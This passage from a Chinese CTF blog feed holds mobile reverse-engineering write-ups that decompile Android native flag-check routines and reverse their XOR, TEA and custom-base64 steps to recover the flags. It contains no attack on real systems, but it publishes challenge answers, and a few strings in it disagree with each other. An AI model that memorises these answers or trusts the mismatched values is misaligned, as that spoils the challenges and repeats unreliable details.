<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> __fastcall <span class="title">Java_com_example_test_ctf03_JNI_getResult</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BOOL4 v3; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = (<span class="keyword">const</span> <span class="keyword">char</span> *)(*(<span class="keyword">int</span> (__fastcall **)(<span class="keyword">int</span>, <span class="keyword">int</span>, _DWORD))(*(_DWORD *)a1 + <span class="number">676</span>))(a1, a3, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v4) == <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">1u</span>);</span><br><span class="line">    v6 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">1u</span>);</span><br><span class="line">    v7 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">1u</span>);</span><br><span class="line">    Init(v5, v6, v7, v4, <span class="number">15</span>);<span class="comment">//将字符串分为a1,a2,a3</span></span><br><span class="line">    <span class="keyword">if</span> ( !First(v5) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">4</span>; ++i )</span><br><span class="line">      v6[i] ^= v5[i];</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v6, a5) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j != <span class="number">4</span>; ++j )</span><br><span class="line">        v7[j] ^= v6[j];</span><br><span class="line">      v3 = <span class="built_in">strcmp</span>(v7, <span class="string">&quot;AFBo&#125;&quot;</span>) == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">LABEL_6:</span><br><span class="line">      v3 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的代码中有几个调用的函数，init()、First()函数，我们来一一分析下这两个函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">Init</span><span class="params">(<span class="keyword">int</span> result, <span class="keyword">char</span> *a2, <span class="keyword">char</span> *a3, <span class="keyword">const</span> <span class="keyword">char</span> *a4, <span class="keyword">int</span> a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// r6</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a5 &lt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = v5 % <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v5 % <span class="number">3</span> == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        a3[v5 / <span class="number">3u</span>] = a4[v5];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v7 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        a2[v5 / <span class="number">3u</span>] = a4[v5];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v6;</span><br><span class="line">        *(_BYTE *)(result + v5 / <span class="number">3u</span>) = a4[v5];</span><br><span class="line">      &#125;</span><br><span class="line">      ++v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( a5 != v5 );</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(result + v6) = <span class="number">0</span>;</span><br><span class="line">  a2[v6] = <span class="number">0</span>;</span><br><span class="line">  a3[v6] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的代码逻辑是将字符串分为三个部分，依次按照a1,a2,a3的顺序来保存</p>
<p>接下来看看First()函数的代码，这里是将a1的字符进行运算后与常量”LN^dl”作比较</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> __fastcall <span class="title">First</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// r1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">4</span>; ++i )</span><br><span class="line">    a1[i] = (<span class="number">2</span> * a1[i]) ^ <span class="number">0x80</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(a1, <span class="string">&quot;LN^dl&quot;</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以对该代码进行逆向倒推出满足该程序的字符串，代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">re_first</span>():</span></span><br><span class="line">    b = <span class="string">&quot;LN^d1&quot;</span></span><br><span class="line">    a1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        a1 += <span class="built_in">chr</span>(<span class="built_in">int</span>((<span class="built_in">ord</span>(b[i])^<span class="number">0x80</span>)/<span class="number">2</span>))</span><br><span class="line">    a1+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(a1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    re_first()</span><br></pre></td></tr></table></figure>

<p>得到a1原来的值为<strong>fgor1</strong>，但经过该函数的调用后a1变为了”<strong>LN^d1</strong>“，接下来对a2和a3进行了变换</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">4</span>; ++i )</span><br><span class="line">      v6[i] ^= v5[i];</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v6, a5) )<span class="comment">//v6=a5，a5=&quot; 5-&quot;+0x16+&quot;a&quot;</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j != <span class="number">4</span>; ++j )</span><br><span class="line">        v7[j] ^= v6[j];</span><br><span class="line">      v3 = <span class="built_in">strcmp</span>(v7, <span class="string">&quot;AFBo&#125;&quot;</span>) == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>对a2和a3进行逆向反推获取原来的字符串，代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">re_second</span>():</span></span><br><span class="line">    a5 = [<span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;5&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;-&#x27;</span>),<span class="number">0x16</span>,<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)]</span><br><span class="line">    v5 = [<span class="built_in">ord</span>(<span class="string">&#x27;L&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;N&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;^&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;d&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;1&#x27;</span>)]</span><br><span class="line">    v6 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">        v6 += <span class="built_in">chr</span>(a5[i]^v5[i])</span><br><span class="line">    v6+=<span class="string">&#x27;a&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(v6)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">re_thrid</span>():</span></span><br><span class="line">    v6 = [<span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;5&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;-&#x27;</span>),<span class="number">0x16</span>,<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)]</span><br><span class="line">    a = <span class="string">&quot;AFBo&quot;</span></span><br><span class="line">    v7 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">        v7 += <span class="built_in">chr</span>(v6[i]^<span class="built_in">ord</span>(a[i]))</span><br><span class="line">    v7 += ”&#125;“</span><br><span class="line">    <span class="built_in">print</span>(v7)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到原来的a2为 <strong>”l{sra“</strong> a3为<strong>”asyo}“</strong></p>
<p>到这里就得到了a1,a2和a3变换后的值，根据最上面的init()逆向分析将这三个变量进行拼接，代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">re_str</span>():</span></span><br><span class="line">    a1 = <span class="string">&#x27;fgor1&#x27;</span></span><br><span class="line">    a2 = <span class="string">&#x27;l&#123;sra&#x27;</span></span><br><span class="line">    a3 = <span class="string">&#x27;asoy&#125;&#x27;</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        flag += a1[i]+a2[i]+a3[i]</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>最后得到正确的字符串<strong>flag{sosorry1a}</strong></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Mobile</category>
      </categories>
      <tags>
        <tag>-CTF -Mobile</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Moblie系列之Easy-app</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8BEasy-app/</url>
    <content><![CDATA[<h1 id="【攻防世界】Mobile系列之Easy-app"><a href="#【攻防世界】Mobile系列之Easy-app" class="headerlink" title="【攻防世界】Mobile系列之Easy-app"></a>【攻防世界】Mobile系列之Easy-app</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>该app也是一个登录验证逻辑</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8BEasy-app/image-20231024185234104.png" class title="image-20231024185234104">

<p>使用jadx反汇编该app,调用了native层的native-lib.so文件对字符串进行检验</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8BEasy-app/image-20231024185752509.png" class title="image-20231024185752509">使用ida打开native-lib.so文件，找到MainActivity_check方法，看到一长串的伪代码如下

<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8BEasy-app/image-20231024192709371.png" class title="image-20231024192709371">

<p>想通过上面的伪代码去得到逻辑关系是比较困难，反正我有点不想看。外面再通过字符串来对伪代码进行理解，在IDA中查看该so文件用到的字符串，如下</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8BEasy-app/image-20231024193157336.png" class title="image-20231024193157336">



<p>check函数进行第一次转换，去掉flag格式，将输入分成两组，一组16个字符。</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8BEasy-app/image-20231024201454831.png" class title="image-20231024201454831">

<p>将前十六位的高四位和后十六位的低四位组合存放到后十六位，将后十六位的高四位和前十六位的低四位组合存放到前十六位。</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8BEasy-app/image-20231024201552807.png" class title="image-20231024201552807">

<p>之后在分成4组进行tea加密，key这里运行时候被修改了，正确的应该是0x42,0x37,0x2c,0x21。</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8BEasy-app/image-20231024201611402.png" class title="image-20231024201611402">

<p>之后进行换表base64加密，这个有一个点就是，base64_encode中不止包括了base64加密，还有移位操作。将编码之后的base64，每三位循环向左移动，第四位做分隔符不变。从文件中找base64的表为abcdefghijklmnopqrstuvwxyz!@#$%^&amp;*()ABCDEFGHIJKLMNOPQRSTUVWXYZ+&#x2F;，所有算法反推回去就是flag。</p>
<h2 id="逆向代码"><a href="#逆向代码" class="headerlink" title="逆向代码"></a>逆向代码</h2><p>将移位后的base64编码进行还原</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"> </span><br><span class="line">base64_out=<span class="string">&quot;e)n*pNe%PQy!^oS(@HtkUu+Cd$#hmmK&amp;ieytiWwYkIA=&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(base64_out))<span class="comment">#44</span></span><br><span class="line">base64_ok=<span class="string">&quot;&quot;</span></span><br><span class="line">temp=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(base64_out)):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">4</span>==<span class="number">0</span>:</span><br><span class="line">        temp=base64_out[i:i+<span class="number">4</span>]</span><br><span class="line">        <span class="comment">#print(temp)</span></span><br><span class="line">        base64_ok+=temp[<span class="number">2</span>]</span><br><span class="line">        base64_ok+=temp[<span class="number">0</span>]</span><br><span class="line">        base64_ok+=temp[<span class="number">1</span>]</span><br><span class="line">        base64_ok+=temp[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(base64_ok)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ne)*epN%yPQ!S^o(t@Hk+UuC#d$hKmm&amp;yietwiWYAkI=</span></span><br></pre></td></tr></table></figure>

<p>对上方的字符串进行base64解码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">base64_ok=<span class="string">&quot;ne)*epN%yPQ!S^o(t@Hk+UuC#d$hKmm&amp;yietwiWYAkI=&quot;</span></span><br><span class="line"> </span><br><span class="line">outtab  = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">intab   = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz!@#$%^&amp;*()ABCDEFGHIJKLMNOPQRSTUVWXYZ+/&quot;</span></span><br><span class="line"> </span><br><span class="line">teaout=(base64.b64decode(base64_ok.translate(base64_ok.maketrans(intab,outtab))))<span class="comment">#b&#x27;4H\xe1\x10\xfc^c=\x1a\xd9\xf3\xa2M\xba\xca\xfb\x85&amp;p7G\xb8\xc3 `\x81\x13X\x8e\xbc\x90\xab&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(teaout)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(teaout))</span><br><span class="line">tea_out=binascii.hexlify(teaout).decode(<span class="string">&#x27;utf-8&#x27;</span>)<span class="comment">#https://www.delftstack.com/zh/howto/python/python-convert-hex-to-byte/</span></span><br><span class="line"><span class="built_in">print</span>(tea_out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3448e110fc5e633d1ad9f3a24dbacafb8526703747b8c320608113588ebc90ab</span><br></pre></td></tr></table></figure>

<p>然后再进行tea解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"> </span><br><span class="line">void decrypt(unsigned int *v, unsigned int *k)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0 = v[0], v1 = v[1], sum = 0xC6EF3720, i;</span><br><span class="line">  unsigned int delta = 0x9e3779b9;</span><br><span class="line">  unsigned int k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];</span><br><span class="line">  for (i = 0; i &lt; 32; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3);</span><br><span class="line">    v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1);</span><br><span class="line">    sum -= delta;</span><br><span class="line">  &#125;</span><br><span class="line">  v[0] = v0;</span><br><span class="line">  v[1] = v1;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    int i=0;</span><br><span class="line">    unsigned int v[2] = &#123;0, 0&#125;, k[4] = &#123;66, 55, 44, 33&#125;;</span><br><span class="line"> </span><br><span class="line">    char tea_out[64]=&quot;\x34\x48\xe1\x10\xfc\x5e\x63\x3d\x1a\xd9\xf3\xa2\x4d\xba\xca\xfb\x85\x26\x70\x37\x47\xb8\xc3\x20\x60\x81\x13\x58\x8e\xbc\x90\xab&quot;;</span><br><span class="line"> </span><br><span class="line">    for(i=0;i&lt;strlen(tea_out);i+=8)&#123;</span><br><span class="line">            unsigned int *v=(unsigned int *)&amp;tea_out[i];</span><br><span class="line">            //printf(&quot;%x %x\n&quot;, v[0], v[1]);</span><br><span class="line">            decrypt(v, k);</span><br><span class="line">            printf(&quot;%x %x\n&quot;, v[0], v[1]);</span><br><span class="line">    &#125;</span><br><span class="line">      return 0;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">/*</span><br><span class="line">36346065 38673534</span><br><span class="line">65353537 62303531</span><br><span class="line">61333232 34363160</span><br><span class="line">63316239 35356761</span><br><span class="line">即6560343634356738373535653135306232323361603136343962316361673535</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<p>然后进行高位计算</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tea=&quot;6560343634356738373535653135306232323361603136343962316361673535&quot;</span><br><span class="line">tea1=tea[::2]#从0都结束 每step2进行取值     https://blog.csdn.net/Evan123mg/article/details/49232089</span><br><span class="line">tea2=tea[1::2]#从1都结束 每step2进行取值</span><br><span class="line">print(tea1)#6633336333363336   3336633336366633</span><br><span class="line">print(tea2)#50464578755515022231016492131755</span><br><span class="line"> </span><br><span class="line">temp=tea1[16:]+tea1[:16] #3336633336366633  6633336333363336  高16位和低16位换位置</span><br><span class="line">print(temp)</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(len(temp)):</span><br><span class="line">    flag+=temp[i]+tea2[i]</span><br><span class="line">print(flag)#3530346664353738376535656165303262623331303166343932316331373565</span><br><span class="line">print(bytes.fromhex(flag))</span><br><span class="line"></span><br><span class="line">b&#x27;504fd5787e5eae02bb3101f4921c175e&#x27;</span><br></pre></td></tr></table></figure>

<p>最后得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;504fd5787e5eae02bb3101f4921c175e&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>Mobile</category>
      </categories>
      <tags>
        <tag>-CTF -Mobile</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Moblie系列之Easy-so</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8BEasy-so/</url>
    <content><![CDATA[<h1 id="【攻防世界】Mobile系列之Easy-so"><a href="#【攻防世界】Mobile系列之Easy-so" class="headerlink" title="【攻防世界】Mobile系列之Easy-so"></a>【攻防世界】Mobile系列之Easy-so</h1><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>运行该apk,就是一个登陆验证程序，通过验证输入字符串来返回不同提示信息</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8BEasy-so/image-20231024130738631.png" class title="image-20231024130738631">

<p>使用jadx工具对目标apk进行反编译，先来定位MainActivity类的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.support.v7.app.AppCompatActivity, android.support.v4.app.SupportActivity, android.support.v4.app.FragmentActivity</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        ((Button) findViewById(R.id.button)).setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="comment">/* class com.testjava.jack.pingan2.MainActivity.AnonymousClass1 */</span></span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (cyberpeace.CheckString(((EditText) MainActivity.<span class="keyword">this</span>.findViewById(R.id.editText)).getText().toString()) == <span class="number">1</span>) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;验证通过!&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;验证失败!&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里只用了一个cyberpeace.checkString方法来对输入框中字符串进行检验，该函数为一个native层的so文件。我们把so文件拖入IDA进行分析，定位CheckString函数</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8BEasy-so/image-20231024131735316.png" class title="image-20231024131735316">

<p>反汇编获取其伪代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool __fastcall Java_com_testjava_jack_pingan2_cyberpeace_CheckString(__int64 a1, __int64 a2, __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  const char *v3; // x20</span><br><span class="line">  __int64 v4; // x0</span><br><span class="line">  signed int v5; // w21</span><br><span class="line">  unsigned __int64 v6; // x22</span><br><span class="line">  _BYTE *v7; // x0</span><br><span class="line">  _BYTE *v8; // x19</span><br><span class="line">  size_t v9; // w2</span><br><span class="line">  unsigned __int64 v10; // x20</span><br><span class="line">  _BYTE *v11; // x8</span><br><span class="line">  char v12; // w9</span><br><span class="line">  char v13; // w10</span><br><span class="line">  char v14; // w9</span><br><span class="line">  __int64 v15; // x20</span><br><span class="line">  _BYTE *v16; // x8</span><br><span class="line">  char v17; // w10</span><br><span class="line">  unsigned __int64 v18; // x0</span><br><span class="line">  unsigned __int64 v19; // x8</span><br><span class="line"></span><br><span class="line">  v3 = (const char *)(*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + 1352LL))(a1, a3, 0LL);</span><br><span class="line">  v4 = strlen(v3); //计算输入的字符串长度</span><br><span class="line">  v5 = v4;</span><br><span class="line">  v6 = ((v4 &lt;&lt; 32) + 0x100000000LL) &gt;&gt; 32;</span><br><span class="line">  v7 = malloc((unsigned __int64)((v4 &lt;&lt; 32) + 0x100000000LL) &gt;&gt; 32); //根据字符串长度开辟内存空间，v7为指向头的指针</span><br><span class="line">  v8 = v7;</span><br><span class="line">  if ( v6 &gt; v5 )</span><br><span class="line">    v9 = v6 - v5;</span><br><span class="line">  else</span><br><span class="line">    v9 = 0;</span><br><span class="line">  memset(&amp;v7[v5], 0, v9);     //将v7长度扩增一倍并添加的都是0</span><br><span class="line">  memcpy(v8, v3, v5);         //将v3的内容复制给v8</span><br><span class="line">  if ( strlen(v8) &gt;= 2uLL )   //将v8的第v10个字符与第v10+16个字符交换位置</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = 0LL;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = &amp;v8[v10]; //v11为v8的首地址</span><br><span class="line">      v12 = v8[v10 + 16];  </span><br><span class="line">      v13 = v8[v10++];</span><br><span class="line">      *v11 = v12;</span><br><span class="line">      v11[16] = v13;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( (unsigned __int64)strlen(v8) &gt;&gt; 1 &gt; v10 );</span><br><span class="line">  &#125;</span><br><span class="line">  if ( *v8 )        //进行位置变换，每两个字符串头尾交换</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = v8[1];</span><br><span class="line">    v8[1] = *v8;</span><br><span class="line">    *v8 = v14;</span><br><span class="line">    if ( strlen(v8) &gt;= 3uLL )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 = 0LL;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        v16 = &amp;v8[v15];</span><br><span class="line">        v17 = v8[v15 + 2];</span><br><span class="line">        v16[2] = v8[v15 + 3];</span><br><span class="line">        v16[3] = v17;</span><br><span class="line">        v18 = strlen(v8);</span><br><span class="line">        v19 = v15 + 4;</span><br><span class="line">        v15 += 2LL;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v18 &gt; v19 );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return strcmp(v8, &quot;f72c5a36569418a20907b55be5bf95ad&quot;) == 0;   //将变换后的v8与&quot;f72c5a36569418a20907b55be5bf95ad&quot;字符串作比较</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据上述代码来对原字符串进行一个逻辑反推</p>
<ul>
<li>f7 2c 5a 36 56 94 18 a2 09 07 b5 5b e5 bf 95 ad 两两交换，得到7f c2 a5 63 65 49 81 2a 90 70 5b b5 5e fb 59 da</li>
<li>将7f c2 a5 63 65 49 81 2a 90 70 5b b5 5e fb 59 da均分成两断，头尾互换得到90 70 5b b5 5e fb 59 da 7f c2 a5 63 65 49 81 2a</li>
<li>得到flag{90705bb55efb59da7fc2a5636549812a}</li>
</ul>
<h2 id="算法还原"><a href="#算法还原" class="headerlink" title="算法还原"></a>算法还原</h2><p>python脚本</p>
